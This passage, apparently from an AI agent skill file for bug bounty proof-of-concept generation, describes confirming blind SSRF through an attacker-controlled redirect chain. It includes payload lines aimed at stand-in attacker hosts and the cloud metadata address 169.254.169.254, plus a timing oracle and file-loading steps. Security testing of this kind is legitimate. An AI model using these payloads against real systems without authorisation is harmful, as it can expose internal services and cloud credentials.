technique to make blind SSRF observable without external DNS callbacks.

1. **Set up a controlled redirect chain** on an attacker-controlled server (or use a public
   redirect service that logs inbound requests):
   ```
   GET /redirect?to=http://192.168.1.1:80  â†’  HTTP 302 Location: http://attacker-log.example.com/hit?id={{poc_id}}
   ```
2. **Deliver the redirect chain URL** as the SSRF payload:
   ```
   ssrf_param=http://attacker-redirect.example.com/redirect?to=http://169.254.169.254/
   ```
3. **Observe whether the final redirect destination receives a callback.** If the server follows
   the chain and hits the logging endpoint, SSRF is confirmed even without DNS OOB.
4. **Redirect loop stall oracle:** If the target follows redirect 1 but the chain loops back to
   itself (e.g., Aâ†’Bâ†’A), the server may stall or time out with a distinctive error â€” confirm
   via response timing delta > 5 s compared to a non-SSRF baseline.
5. On redirect-loop confirmation emit:
   - `ssrf_redirect_loop_confirmed: true`
   - `oob_available: false`
   - `detection_method: redirect_loop_oracle`
   - Upgrade severity from MEDIUM cap to HIGH if internal address confirmed in redirect destination.

## Protocol Dispatch

> **Progressive Disclosure** — protocol detail lives in `protocols/` subfiles.
> Load only the protocols triggered by the current run's findings.
> Call `read_file` on each required subfile **before** generating any PoC steps.
> Never invent protocol steps from memory — only follow the loaded subfile.

**Subfile base path**: `skills/BugBountyHunter/PoCForge/protocols/`

**Loading procedure**:
```
FOR each finding in triage_ranked WHERE exploit_score >= 6.5:
  1. Match finding.vuln_class against the dispatch table below.
  2. Call read_file("skills/BugBountyHunter/PoCForge/protocols/<file>") for each match.
  3. Wait for file content before emitting any PoC step for that finding.
  4. Follow the loaded protocol exactly — do not improvise steps.
